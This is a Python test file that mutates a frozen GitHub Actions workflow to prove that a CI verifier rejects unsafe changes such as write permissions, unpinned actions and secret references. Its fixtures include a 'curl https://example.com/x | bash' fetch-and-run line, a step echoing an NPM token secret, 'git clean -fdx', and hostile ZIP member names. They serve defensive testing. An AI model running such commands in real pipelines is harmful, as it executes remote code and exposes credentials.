"""U-P2 Wave 1: focused mutation tests for the delivery-gate verifier.

Contract: agentic-os-v0.4-u-p2-delivery-gate-contract.md §12–§13 (D-v0.4.41).

These tests drive the REAL verifier entrypoint (`main`) and public functions,
inspect actual exit codes and emitted reason codes, and prove — against the one
frozen canonical workflow and deliberately mutated copies written to temporary
directories OUTSIDE the repository — that:

  * the canonical workflow passes (exit 0, no findings);
  * every one of the 20 closed reason codes is reachable;
  * every §12.4 non-canonical construct (bypass class) fails closed;
  * findings are deterministically ordered and value-free;
  * an internal failure yields `internal_error` with no traceback;
  * the verifier never mutates the workflow and makes no network/subprocess call;
  * action pins, job ids, check names, triggers, Python lines, runner, timeouts,
    and required commands are exact; and
  * the canonical grammar rejects semantically-equivalent but non-canonical YAML.

They assert closed reason codes and observable non-mutation, never generic prose.
"""

from __future__ import annotations

import ast
import contextlib
import errno
import importlib.util
import io
import os
import shutil
import socket
import stat
import subprocess
import sys
import tempfile
import textwrap
import unittest
import warnings
import zipfile
from pathlib import Path
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parent.parent
VERIFIER_PATH = REPO_ROOT / "tools" / "verify_ci_workflow.py"
WORKFLOW_PATH = REPO_ROOT / ".github" / "workflows" / "ci.yml"

CHECKOUT_SHA = "3d3c42e5aac5ba805825da76410c181273ba90b1"
SETUP_PYTHON_SHA = "5fda3b95a4ea91299a34e894583c3862153e4b97"
CHECK_NAMES = (
    "workflow-integrity",
    "tests-python-3.12",
    "tests-python-3.14",
    "distribution-smoke-python-3.12",
)
FROZEN_REASON_CODES = frozenset({
    "missing_workflow",
    "invalid_utf8",
    "crlf_present",
    "mutable_action_ref",
    "unapproved_action",
    "credential_persistence",
    "write_permission",
    "pull_request_target",
    "secret_reference",
    "continue_on_error",
    "missing_timeout",
    "missing_required_job",
    "missing_required_trigger",
    "missing_python_line",
    "missing_full_suite",
    "missing_distribution_smoke",
    "artifact_upload",
    "shell_download",
    "unexpected_workflow_shape",
    "internal_error",
})


def _load_verifier():
    spec = importlib.util.spec_from_file_location("aos_verify_ci_workflow", VERIFIER_PATH)
    assert spec is not None and spec.loader is not None, f"cannot load {VERIFIER_PATH}"
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


class VerifierTestBase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.vcw = _load_verifier()
        cls.canonical = cls.vcw.CANONICAL_TEXT

    # -- running -----------------------------------------------------------

    def run_argv(self, argv):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = self.vcw.main(argv)
        return code, out.getvalue(), err.getvalue()

    def _tmp_workflow(self, data: bytes) -> Path:
        directory = Path(tempfile.mkdtemp(prefix="aos-verify-"))
        self.addCleanup(shutil.rmtree, directory, ignore_errors=True)
        path = directory / "ci.yml"
        path.write_bytes(data)
        return path

    def verify_bytes(self, data: bytes):
        path = self._tmp_workflow(data)
        return self.run_argv(["--workflow", str(path)])

    def verify_text(self, text: str):
        return self.verify_bytes(text.encode("utf-8"))

    def codes(self, out: str):
        return [line.split(" ", 1)[0] for line in out.splitlines()]

    def mutate(self, old: str, new: str, count: int = 1) -> str:
        self.assertIn(old, self.canonical, f"mutation anchor absent: {old!r}")
        return self.canonical.replace(old, new, count)


# ---------------------------------------------------------------------------
# Acceptance of the one canonical workflow.

class CanonicalAcceptanceTests(VerifierTestBase):
    def test_embedded_canonical_matches_the_real_workflow_file(self):
        """The embedded authority has not drifted from .github/workflows/ci.yml."""
        on_disk = WORKFLOW_PATH.read_bytes().decode("utf-8")
        self.assertEqual(self.canonical, on_disk)

    def test_default_target_accepts_the_canonical_workflow(self):
        code, out, err = self.run_argv([])
        self.assertEqual(code, 0, out + err)
        self.assertEqual(out, "")

    def test_explicit_workflow_flag_accepts_the_canonical_workflow(self):
        code, out, err = self.run_argv(["--workflow", str(WORKFLOW_PATH)])
        self.assertEqual(code, 0, out + err)
        self.assertEqual(out, "")

    def test_workflow_equals_flag_form_is_accepted(self):
        code, out, _ = self.run_argv([f"--workflow={WORKFLOW_PATH}"])
        self.assertEqual(code, 0, out)


# ---------------------------------------------------------------------------
# Every one of the 20 reason codes is reachable, and the vocabulary is closed.

class ReasonCodeReachabilityTests(VerifierTestBase):
    def test_reason_vocabulary_is_exactly_the_frozen_twenty(self):
        self.assertEqual(self.vcw.REASON_CODES, FROZEN_REASON_CODES)
        self.assertEqual(len(self.vcw.REASON_CODES), 20)

    def test_every_reason_code_is_reachable(self):
        reached: set[str] = set()

        def feed_text(text, expect_code=None):
            code, out, _ = self.verify_text(text)
            self.assertEqual(code, 1, out)
            found = self.codes(out)
            self.assertTrue(found)
            self.assertLessEqual(set(found), FROZEN_REASON_CODES)
            if expect_code is not None:
                self.assertIn(expect_code, found)
            reached.update(found)

        # 1. missing_workflow — a path that does not exist.
        directory = Path(tempfile.mkdtemp(prefix="aos-verify-absent-"))
        self.addCleanup(shutil.rmtree, directory, ignore_errors=True)
        code, out, _ = self.run_argv(["--workflow", str(directory / "absent.yml")])
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_workflow\n")
        reached.update(self.codes(out))

        # 2. invalid_utf8 — undecodable bytes.
        code, out, _ = self.verify_bytes(b"\xff\xfe\xfa not valid utf-8\n")
        self.assertEqual(code, 1)
        self.assertEqual(out, "invalid_utf8\n")
        reached.update(self.codes(out))

        # 3. crlf_present — canonical content with CRLF endings.
        code, out, _ = self.verify_bytes(self.canonical.replace("\n", "\r\n").encode("utf-8"))
        self.assertEqual(code, 1)
        self.assertEqual(out, "crlf_present\n")
        reached.update(self.codes(out))

        # 4. mutable_action_ref — a tag instead of the frozen SHA.
        feed_text(
            self.mutate(f"actions/checkout@{CHECKOUT_SHA}", "actions/checkout@main"),
            "mutable_action_ref",
        )
        # 5. unapproved_action — a repo off the allowlist.
        feed_text(
            self.mutate(f"uses: actions/checkout@{CHECKOUT_SHA}", f"uses: hacker/checkout@{CHECKOUT_SHA}"),
            "unapproved_action",
        )
        # 6. credential_persistence — checkout that keeps credentials.
        feed_text(
            self.mutate("persist-credentials: false", "persist-credentials: true"),
            "credential_persistence",
        )
        # 7. write_permission — a write scope.
        feed_text(self.mutate("contents: read", "contents: write"), "write_permission")
        # 8. pull_request_target — the forbidden trigger, added alongside the rest.
        feed_text(
            self.mutate("  workflow_dispatch:\n", "  workflow_dispatch:\n  pull_request_target:\n"),
            "pull_request_target",
        )
        # 9. secret_reference — a secrets context.
        feed_text(
            self.mutate(
                "        run: python3 tools/verify_ci_workflow.py",
                '        run: echo "${{ secrets.NPM_TOKEN }}" && python3 tools/verify_ci_workflow.py',
            ),
            "secret_reference",
        )
        # 10. continue_on_error — a hidden-failure step.
        feed_text(
            self.mutate("    timeout-minutes: 10\n", "    timeout-minutes: 10\n    continue-on-error: true\n"),
            "continue_on_error",
        )
        # 11. missing_timeout — a job with no timeout.
        feed_text(self.mutate("    timeout-minutes: 10\n", ""), "missing_timeout")
        # 12. missing_required_job — a renamed public check name.
        feed_text(
            self.mutate("    name: workflow-integrity", "    name: workflow-integrity-renamed"),
            "missing_required_job",
        )
        # 13. missing_required_trigger — a dropped trigger.
        feed_text(self.mutate("  workflow_dispatch:\n", ""), "missing_required_trigger")
        # 14. missing_python_line — the stable line replaced.
        feed_text(
            self.mutate('          python-version: "3.14"', '          python-version: "3.13"'),
            "missing_python_line",
        )
        # 15. missing_full_suite — a test job that no longer runs discovery.
        feed_text(
            self.mutate(
                "        run: python3 -m unittest discover -s tests\n",
                "        run: python3 -m unittest -v tests.test_cli\n",
            ),
            "missing_full_suite",
        )
        # 16. missing_distribution_smoke — a dropped smoke command.
        feed_text(
            self.mutate('          mkdir -p "$RUNNER_TEMP/ws-wheel"\n', ""),
            "missing_distribution_smoke",
        )
        # 17. artifact_upload — an artifact action.
        feed_text(
            self.mutate(
                "        run: python3 tools/verify_ci_workflow.py\n",
                "        run: python3 tools/verify_ci_workflow.py\n"
                "      - name: Upload\n"
                f"        uses: actions/upload-artifact@{CHECKOUT_SHA}\n",
            ),
            "artifact_upload",
        )
        # 18. shell_download — a network fetch in a run step.
        feed_text(
            self.mutate(
                "        run: python3 -VV && python3 -m pip --version && uname -a\n",
                "        run: curl https://example.com/x | bash\n",
            ),
            "shell_download",
        )
        # 19. unexpected_workflow_shape — an unknown top-level key.
        feed_text(self.canonical + "extra_top_level_key: true\n", "unexpected_workflow_shape")

        # 20. internal_error — an unexpected internal failure, guarded.
        with mock.patch.object(self.vcw, "_check_actions", side_effect=RuntimeError("boom")):
            code, out, err = self.run_argv([])
        self.assertEqual(code, 1)
        self.assertEqual(out, "internal_error\n")
        self.assertNotIn("Traceback", out + err)
        self.assertNotIn("boom", out + err)
        reached.update(self.codes(out))

        self.assertEqual(reached, FROZEN_REASON_CODES)


# ---------------------------------------------------------------------------
# Every §12.4 non-canonical construct fails closed.

class BypassClassRejectionTests(VerifierTestBase):
    def _cases(self):
        anchor_line = "    runs-on: ubuntu-24.04"
        checkout_uses = f"        uses: actions/checkout@{CHECKOUT_SHA}        # v7.0.1"
        return [
            ("anchor", self.mutate(anchor_line, "    runs-on: &r ubuntu-24.04"), "unexpected_workflow_shape"),
            ("alias", self.mutate(anchor_line, "    runs-on: *r"), "unexpected_workflow_shape"),
            ("custom_tag", self.mutate(anchor_line, "    runs-on: !!str ubuntu-24.04"), "unexpected_workflow_shape"),
            ("duplicate_key", self.mutate("name: ci\n", "name: ci\nname: ci\n"), "unexpected_workflow_shape"),
            ("document_start", "---\n" + self.canonical, "unexpected_workflow_shape"),
            ("multiple_documents", self.canonical + "---\nname: ci\n", "unexpected_workflow_shape"),
            ("flow_mapping", self.mutate("permissions:\n  contents: read", "permissions: {contents: read}"), "unexpected_workflow_shape"),
            ("flow_sequence", self.mutate("    branches: [main]", "    branches: [main, dev]"), "unexpected_workflow_shape"),
            ("quoted_key", self.mutate("permissions:\n", '"permissions":\n'), "unexpected_workflow_shape"),
            # An alternate boolean spelling is caught by the more specific
            # credential_persistence code (§12.4 permits a more specific code).
            ("alternate_boolean", self.mutate("persist-credentials: false", "persist-credentials: False"), "credential_persistence"),
            ("job_level_permissions", self.mutate(
                "    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n",
                "    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    timeout-minutes: 10\n",
            ), "unexpected_workflow_shape"),
            ("local_action", self.mutate(checkout_uses, "        uses: ./.github/actions/local-checkout"), "unexpected_workflow_shape"),
            ("reusable_workflow", self.mutate(
                "jobs:\n",
                f"jobs:\n  reusable:\n    uses: octo-org/repo/.github/workflows/x.yml@{CHECKOUT_SHA}\n",
            ), "unexpected_workflow_shape"),
            ("folded_uses", self.mutate(
                checkout_uses,
                f"        uses: >-\n          actions/checkout@{CHECKOUT_SHA}",
            ), "unexpected_workflow_shape"),
            ("unexpected_block_scalar", self.mutate(
                "        run: python3 tools/verify_ci_workflow.py",
                "        run: >\n          python3 tools/verify_ci_workflow.py",
            ), "unexpected_workflow_shape"),
            ("unknown_step_key", self.mutate(
                "      - name: Verify workflow integrity\n",
                "      - name: Verify workflow integrity\n        unknownkey: value\n",
            ), "unexpected_workflow_shape"),
            # Shell indirection that WRAPS the frozen command: the substring is
            # still present, proving acceptance is affirmative recognition, not
            # substring search.
            ("shell_indirection", self.mutate(
                "        run: python3 -m unittest discover -s tests",
                '        run: bash -c "python3 -m unittest discover -s tests"',
            ), "unexpected_workflow_shape"),
        ]

    def test_every_bypass_class_fails_closed(self):
        for name, text, expected in self._cases():
            with self.subTest(bypass=name):
                code, out, err = self.verify_text(text)
                self.assertEqual(code, 1, f"{name}: expected exit 1\n{out}{err}")
                found = self.codes(out)
                self.assertTrue(found, f"{name}: expected at least one finding")
                self.assertLessEqual(set(found), FROZEN_REASON_CODES, name)
                self.assertIn(expected, found, f"{name}: got {found}")

    def test_shell_indirection_is_rejected_despite_the_substring_being_present(self):
        text = self.mutate(
            "        run: python3 -m unittest discover -s tests",
            '        run: bash -c "python3 -m unittest discover -s tests"',
        )
        self.assertIn("python3 -m unittest discover -s tests", text)  # substring survives
        code, out, _ = self.verify_text(text)
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])

    def test_semantically_equivalent_reordering_is_rejected(self):
        # Swap the top-level permissions and env blocks: identical meaning to a
        # YAML loader, but not the frozen byte sequence.
        text = self.canonical.replace(
            "permissions:\n  contents: read\n\nenv:\n  PYTHONDONTWRITEBYTECODE: \"1\"\n",
            "env:\n  PYTHONDONTWRITEBYTECODE: \"1\"\n\npermissions:\n  contents: read\n",
            1,
        )
        self.assertNotEqual(text, self.canonical)
        code, out, _ = self.verify_text(text)
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])


# ---------------------------------------------------------------------------
# Determinism, value-freedom, and non-mutation.

class DiagnosticQualityTests(VerifierTestBase):
    def test_multiple_findings_are_deterministically_ordered(self):
        text = self.mutate("contents: read", "contents: write")
        text = text.replace(
            "        run: python3 -VV && python3 -m pip --version && uname -a\n",
            "        run: curl https://example.com/x | bash\n",
            1,
        )
        code, out, _ = self.verify_text(text)
        self.assertEqual(code, 1)
        # sorted by (reason, locus): shell_download < write_permission
        self.assertEqual(out, "shell_download\nwrite_permission\n")
        # Re-running yields byte-identical output.
        _, out2, _ = self.verify_text(text)
        self.assertEqual(out2, out)

    def test_diagnostics_are_value_free(self):
        poison = "ZZ_POISON_SECRET_9f3a_ZZ"
        text = self.mutate(f"uses: actions/checkout@{CHECKOUT_SHA}", f"uses: {poison}/evil@{CHECKOUT_SHA}")
        text = text.replace(
            "        run: python3 tools/gen_protocols.py",
            f"        run: echo {poison}",
            1,
        )
        code, out, err = self.verify_text(text)
        self.assertEqual(code, 1)
        self.assertTrue(out)
        self.assertNotIn(poison, out)
        self.assertNotIn(poison, err)

    def test_no_traceback_on_internal_failure(self):
        with mock.patch.object(self.vcw, "_collect_findings", side_effect=RuntimeError("kaboom")):
            code, out, err = self.run_argv([])
        self.assertEqual(code, 1)
        self.assertEqual(out, "internal_error\n")
        self.assertNotIn("Traceback", err)
        self.assertNotIn("kaboom", out + err)

    def test_verifier_does_not_mutate_the_canonical_file(self):
        before = WORKFLOW_PATH.read_bytes()
        self.run_argv([])
        self.assertEqual(WORKFLOW_PATH.read_bytes(), before)

    def test_verifier_does_not_mutate_a_mutated_fixture(self):
        path = self._tmp_workflow(self.mutate("contents: read", "contents: write").encode("utf-8"))
        before = path.read_bytes()
        self.run_argv(["--workflow", str(path)])
        self.assertEqual(path.read_bytes(), before)

    def test_locus_is_a_frozen_job_id_for_job_scoped_findings(self):
        code, out, _ = self.verify_text(self.mutate("    timeout-minutes: 10\n", ""))
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_timeout workflow-integrity\n")

    def test_locus_is_a_frozen_trigger_name_for_trigger_findings(self):
        code, out, _ = self.verify_text(self.mutate("  workflow_dispatch:\n", ""))
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_required_trigger workflow_dispatch\n")

    def test_locus_is_a_line_number_for_action_findings(self):
        target = f"        uses: actions/checkout@{CHECKOUT_SHA}        # v7.0.1"
        line_number = self.canonical.split("\n").index(target) + 1
        code, out, _ = self.verify_text(self.mutate(target, target.replace(CHECKOUT_SHA, "deadbeef")))
        self.assertEqual(code, 1)
        self.assertEqual(out, f"mutable_action_ref line:{line_number}\n")


# ---------------------------------------------------------------------------
# No network, no subprocess.

class IsolationTests(VerifierTestBase):
    def test_verifier_imports_only_stdlib_and_no_network_or_subprocess(self):
        source = VERIFIER_PATH.read_text()
        tree = ast.parse(source)
        imported: set[str] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    imported.add(alias.name.split(".")[0])
            elif isinstance(node, ast.ImportFrom) and node.module:
                imported.add(node.module.split(".")[0])
        # os/stat/errno are pulled in only by the bounded regular-file reader
        # (O_NOFOLLOW/O_NONBLOCK open, fstat, ELOOP classification) — all
        # standard library, none of them network or subprocess.
        self.assertLessEqual(
            imported, {"__future__", "errno", "os", "re", "stat", "sys", "pathlib"}
        )
        # Admitting os must not smuggle in a process-spawning escape hatch.
        for banned in ("os.system", "os.popen", "os.exec", "os.spawn", "os.posix_spawn", "os.fork"):
            self.assertNotIn(banned, source, banned)

    def test_verifier_never_opens_a_socket_or_spawns_a_subprocess(self):
        boom = AssertionError("network or subprocess used")
        with mock.patch.object(socket, "socket", side_effect=boom), \
                mock.patch.object(subprocess, "Popen", side_effect=boom), \
                mock.patch.object(subprocess, "run", side_effect=boom):
            code, out, err = self.run_argv([])
            self.assertEqual(code, 0, out + err)
            code, out, _ = self.verify_text(self.mutate("contents: read", "contents: write"))
            self.assertEqual(code, 1)


# ---------------------------------------------------------------------------
# Exactness of pins, names, triggers, lines, runner, timeouts, and commands.

class ExactnessTests(VerifierTestBase):
    def test_action_pins_are_the_frozen_shas(self):
        self.assertIn(f"actions/checkout@{CHECKOUT_SHA}", self.canonical)
        self.assertIn(f"actions/setup-python@{SETUP_PYTHON_SHA}", self.canonical)
        self.assertEqual(
            self.vcw.ACTION_ALLOWLIST,
            {"actions/checkout": CHECKOUT_SHA, "actions/setup-python": SETUP_PYTHON_SHA},
        )

    def test_a_wrong_sha_is_rejected_as_mutable(self):
        wrong = "0" * 40
        code, out, _ = self.verify_text(
            self.mutate(f"actions/checkout@{CHECKOUT_SHA}", f"actions/checkout@{wrong}")
        )
        self.assertEqual(code, 1)
        self.assertIn("mutable_action_ref", self.codes(out))

    def test_all_four_public_check_names_are_present(self):
        for name in CHECK_NAMES:
            self.assertIn(f"    name: {name}\n", self.canonical)

    def test_all_four_job_ids_are_present(self):
        for job_id in ("workflow-integrity", "tests-python-3-12", "tests-python-3-14", "distribution-smoke-python-3-12"):
            self.assertIn(f"  {job_id}:\n", self.canonical)

    def test_exact_runner_label_is_required(self):
        code, out, _ = self.verify_text(self.mutate("    runs-on: ubuntu-24.04", "    runs-on: ubuntu-latest"))
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])

    def test_exact_timeout_value_is_required(self):
        code, out, _ = self.verify_text(self.mutate("    timeout-minutes: 10", "    timeout-minutes: 20"))
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])

    def test_top_level_permissions_are_exactly_contents_read(self):
        self.assertIn("permissions:\n  contents: read\n", self.canonical)

    def test_no_job_level_permissions_block_is_accepted(self):
        text = self.mutate(
            "    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n",
            "    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    timeout-minutes: 10\n",
        )
        code, out, _ = self.verify_text(text)
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])

    def test_persist_credentials_false_on_every_checkout(self):
        self.assertEqual(self.canonical.count(f"uses: actions/checkout@{CHECKOUT_SHA}"), 4)
        self.assertEqual(self.canonical.count("persist-credentials: false"), 4)

    def test_exact_triggers_are_present(self):
        for trigger in ("  pull_request:\n", "  push:\n", "  workflow_dispatch:\n"):
            self.assertIn(trigger, self.canonical)

    def test_both_python_feature_lines_are_present(self):
        self.assertIn('python-version: "3.12"', self.canonical)
        self.assertIn('python-version: "3.14"', self.canonical)

    def test_full_suite_command_is_required_in_both_test_jobs(self):
        self.assertEqual(self.canonical.count("python3 -m unittest discover -s tests"), 2)
        code, out, _ = self.verify_text(
            self.mutate(
                "        run: python3 -m unittest discover -s tests\n",
                "        run: python3 -m unittest -v tests.test_cli\n",
            )
        )
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_full_suite tests-python-3-12\n")

    def test_no_artifact_action_local_action_reusable_workflow_or_secret_context(self):
        self.assertNotIn("upload-artifact", self.canonical)
        self.assertNotIn("download-artifact", self.canonical)
        self.assertNotIn("secrets.", self.canonical)
        self.assertNotIn("continue-on-error", self.canonical)
        self.assertNotIn("pull_request_target", self.canonical)
        self.assertNotIn("uses: ./", self.canonical)


# ---------------------------------------------------------------------------
# Distribution-smoke shape: workspace preconditions and bounded cleanup.

class DistributionSmokeShapeTests(VerifierTestBase):
    def test_both_workspace_mkdir_commands_exist(self):
        self.assertIn('mkdir -p "$RUNNER_TEMP/ws-wheel"', self.canonical)
        self.assertIn('mkdir -p "$RUNNER_TEMP/ws-zipapp"', self.canonical)

    def test_removing_ws_wheel_mkdir_is_rejected(self):
        code, out, _ = self.verify_text(self.mutate('          mkdir -p "$RUNNER_TEMP/ws-wheel"\n', ""))
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_distribution_smoke distribution-smoke-python-3-12\n")

    def test_removing_ws_zipapp_mkdir_is_rejected(self):
        code, out, _ = self.verify_text(self.mutate('          mkdir -p "$RUNNER_TEMP/ws-zipapp"\n', ""))
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_distribution_smoke distribution-smoke-python-3-12\n")

    def test_bounded_build_residue_cleanup_exists_and_git_clean_does_not(self):
        self.assertIn("rm -rf build agentic_os.egg-info", self.canonical)
        self.assertNotIn("git clean", self.canonical)

    def test_removing_bounded_cleanup_is_rejected(self):
        code, out, _ = self.verify_text(self.mutate("          rm -rf build agentic_os.egg-info\n", ""))
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_distribution_smoke distribution-smoke-python-3-12\n")

    def test_adding_git_clean_is_rejected(self):
        text = self.mutate(
            "          rm -rf build agentic_os.egg-info\n",
            "          git clean -fdx\n          rm -rf build agentic_os.egg-info\n",
        )
        code, out, _ = self.verify_text(text)
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])

    def test_no_isolation_wheel_build_command_is_present(self):
        self.assertIn("python3 -m build --wheel --no-isolation", self.canonical)

    def test_zipapp_build_command_is_present(self):
        self.assertIn("python3 tools/build_zipapp.py --output", self.canonical)


# ---------------------------------------------------------------------------
# Usage errors.

class UsageErrorTests(VerifierTestBase):
    def test_unknown_argument_is_a_usage_error(self):
        code, out, err = self.run_argv(["--bogus"])
        self.assertEqual(code, 2)
        self.assertEqual(out, "")
        self.assertIn("usage:", err)

    def test_workflow_flag_without_value_is_a_usage_error(self):
        code, out, err = self.run_argv(["--workflow"])
        self.assertEqual(code, 2)
        self.assertEqual(out, "")
        self.assertIn("usage:", err)


# ---------------------------------------------------------------------------
# Wave 2: proofs of the actual workflow blocks and the hardened reader.
#
# These execute the REAL inline Python extracted from ci.yml by stable step
# name — never a re-implementation — and assert on the frozen workflow shape.
# Every expected literal stays test-local; no fixture is written in the repo.

BUILDER_PATH = REPO_ROOT / "tools" / "build_zipapp.py"


def _load_build_zipapp():
    spec = importlib.util.spec_from_file_location("aos_build_zipapp_dg", BUILDER_PATH)
    assert spec is not None and spec.loader is not None, f"cannot load {BUILDER_PATH}"
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


def _step_run_body(workflow_text: str, step_name: str) -> str:
    """Return the dedented shell body of a step's `run: |` block scalar,
    located by its exact `name:`. Dedenting by the block's own base indent
    yields precisely what GitHub's bash would execute."""
    lines = workflow_text.split("\n")
    i = lines.index("      - name: " + step_name)
    j = i + 1
    while lines[j].strip() != "run: |":
        j += 1
    body = []
    k = j + 1
    while k < len(lines):
        line = lines[k]
        if line.strip() == "":
            body.append(line)
            k += 1
            continue
        if len(line) - len(line.lstrip(" ")) <= 8:  # dedent to the step key => end
            break
        body.append(line)
        k += 1
    return textwrap.dedent("\n".join(body))


def _extract_python_block(workflow_text: str, step_name: str) -> str:
    """The exact Python that `python3 - <<'PY' ... PY` runs in a given step."""
    body = _step_run_body(workflow_text, step_name).split("\n")
    start = next(idx for idx, line in enumerate(body) if line.strip() == "python3 - <<'PY'")
    end = next(idx for idx, line in enumerate(body) if idx > start and line.strip() == "PY")
    return "\n".join(body[start + 1:end])


def _synthetic_source_tree(root: Path):
    """A minimal but valid-shaped agentic_os tree: a few package modules plus
    exactly the 13 catalog json files the wheel block requires. Bytes are
    arbitrary — the blocks byte-compare against this tree, they never parse it."""
    (root / "agentic_os" / "catalog").mkdir(parents=True)
    package = {
        "agentic_os/__init__.py": b"__version__ = '0.0.0'\n",
        "agentic_os/__main__.py": b"from agentic_os.cli import main\n",
        "agentic_os/cli.py": b"def main(argv=None):\n    return 0\n",
    }
    catalog = {"agentic_os/catalog/manifest.json": b'{"manifest":1}\n'}
    for index in range(12):
        catalog["agentic_os/catalog/aos.stub%02d.v1.passport.json" % index] = (
            b'{"passport":%d}\n' % index
        )
    for name, data in {**package, **catalog}.items():
        (root / name).write_bytes(data)
    return package, catalog


def _write_zip(path: Path, items) -> None:
    """Write a ZIP whose member names are stored verbatim, so hostile names
    (backslash, traversal, absolute, case collision, duplicate) survive."""
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")  # a deliberate duplicate name warns; that is fine
        with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
            for name, data in items:
                info = zipfile.ZipInfo("placeholder")
                info.filename = name  # bypass ZipInfo's name sanitization
                archive.writestr(info, data)


def _with(items, name, data):
    return [(n, data if n == name else d) for n, d in items]


def _without(items, name):
    return [(n, d) for n, d in items if n != name]


def _run_block(block: str, source_root: Path, runner_temp: Path):
    env = dict(os.environ)
    env.pop("PYTHONPATH", None)  # the block must resolve members from RUNNER_TEMP + cwd only
    env["RUNNER_TEMP"] = str(runner_temp)
    return subprocess.run(
        [sys.executable, "-"],
        input=block.encode("utf-8"),
        cwd=str(source_root),
        env=env,
        capture_output=True,
        timeout=60,
    )


class WorkflowShapeProofTests(VerifierTestBase):
    """Mechanical proofs of the frozen shape and the Wave 2 hardening, asserted
    against the actual .github/workflows/ci.yml. Expected literals are local."""

    def setUp(self):
        self.text = WORKFLOW_PATH.read_text()

    def test_immutable_action_pins_are_exact(self):
        self.assertEqual(
            self.text.count(f"uses: actions/checkout@{CHECKOUT_SHA}        # v7.0.1"), 4
        )
        self.assertEqual(
            self.text.count(f"uses: actions/setup-python@{SETUP_PYTHON_SHA}    # v7.0.0"), 4
        )

    def test_job_ids_and_check_names_are_exact(self):
        for job_id in (
            "workflow-integrity",
            "tests-python-3-12",
            "tests-python-3-14",
            "distribution-smoke-python-3-12",
        ):
            self.assertIn(f"  {job_id}:\n", self.text)
        for name in CHECK_NAMES:
            self.assertIn(f"    name: {name}\n", self.text)

    def test_python_feature_lines_are_exact(self):
        self.assertEqual(self.text.count('python-version: "3.12"'), 3)
        self.assertEqual(self.text.count('python-version: "3.14"'), 1)

    def test_runner_timeouts_triggers_permissions_concurrency_are_exact(self):
        self.assertEqual(self.text.count("runs-on: ubuntu-24.04"), 4)
        self.assertEqual(self.text.count("    timeout-minutes: 10\n"), 1)
        self.assertEqual(self.text.count("    timeout-minutes: 30\n"), 3)
        self.assertIn("permissions:\n  contents: read\n", self.text)
        for trigger in ("  pull_request:\n", "  push:\n", "  workflow_dispatch:\n"):
            self.assertIn(trigger, self.text)
        self.assertIn(
            "concurrency:\n"
            "  group: ci-${{ github.ref }}\n"
            "  cancel-in-progress: ${{ github.event_name == 'pull_request' }}\n",
            self.text,
        )

    def test_pythonpath_is_cleared_before_every_independent_product_execution(self):
        for step in (
            "Install the wheel and smoke the console script",
            "Smoke the zipapp",
            "Assert entrypoint help equivalence",
        ):
            body = _step_run_body(self.text, step)
            statements = [line.strip() for line in body.splitlines() if line.strip()]
            # cleared immediately after strict-bash activation, before execution
            self.assertEqual(statements[0], "set -euo pipefail", step)
            self.assertEqual(statements[1], "unset PYTHONPATH", step)

    def test_module_help_is_the_only_intentional_checkout_source(self):
        body = _step_run_body(self.text, "Assert entrypoint help equivalence")
        self.assertIn('console_help="$("$RUNNER_TEMP/venv/bin/aos" --help)"', body)
        self.assertIn(
            'module_help="$(cd "$GITHUB_WORKSPACE" && python3 -m agentic_os --help)"', body
        )
        self.assertIn('zipapp_help="$(python3 "$RUNNER_TEMP/aos.pyz" --help)"', body)
        self.assertIn('test "$console_help" = "$module_help"', body)
        self.assertIn('test "$console_help" = "$zipapp_help"', body)

    def test_failure_sensitive_git_status_capture(self):
        # Every clean-tree assertion captures status first, so a failing
        # `git status` aborts the step under `set -euo pipefail` rather than
        # being discarded inside a command substitution.
        self.assertEqual(self.text.count('status="$(git status --porcelain)"'), 3)
        self.assertEqual(self.text.count('test -z "$status"'), 3)

    def test_no_discarded_status_or_masked_git_failure(self):
        self.assertNotIn('test -z "$(git status --porcelain)"', self.text)
        # The residue query is captured on its own line, so a git failure is
        # never masked by the `|| true` that tolerates an empty grep result.
        self.assertIn('ignored_residue="$(git status --porcelain --ignored)"', self.text)
        self.assertNotIn("git status --porcelain --ignored | grep", self.text)

    def test_workspace_mkdir_precedes_each_init(self):
        self.assertIn('mkdir -p "$RUNNER_TEMP/ws-wheel"', self.text)
        self.assertIn('mkdir -p "$RUNNER_TEMP/ws-zipapp"', self.text)

    def test_wheel_and_zipapp_run_the_same_smoke_verbs(self):
        wheel = _step_run_body(self.text, "Install the wheel and smoke the console script")
        zipapp = _step_run_body(self.text, "Smoke the zipapp")
        for verb in ("--help", "init", "status", "doctor", "protocol verify-registry"):
            self.assertIn(verb, wheel, verb)
            self.assertIn(verb, zipapp, verb)

    def test_no_hook_management_smoke_command(self):
        for banned in ("hooks install", "hooks status", "hooks uninstall"):
            self.assertNotIn(banned, self.text, banned)

    def test_no_git_clean_anywhere(self):
        self.assertNotIn("git clean", self.text)


class _MembershipBlockTestBase(VerifierTestBase):
    STEP_NAME: str = ""

    @classmethod
    def setUpClass(cls):
        super().setUpClass()
        cls.block = _extract_python_block(WORKFLOW_PATH.read_text(), cls.STEP_NAME)
